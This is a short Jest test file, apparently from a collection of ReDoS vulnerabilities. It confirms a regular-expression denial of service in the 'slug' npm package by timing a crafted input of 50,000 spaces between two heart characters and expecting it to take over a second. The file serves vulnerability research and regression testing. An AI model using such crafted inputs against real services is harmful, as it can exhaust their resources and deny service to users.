//https://github.com/sola-da/ReDoS-vulnerabilities/blob/master/test-slug.js
test("ReDos in slug", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const slug = require('slug');

    let t = measureTime(function () {
        slug('♥' + genstr(50000, ' ') + '♥');
    });

    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});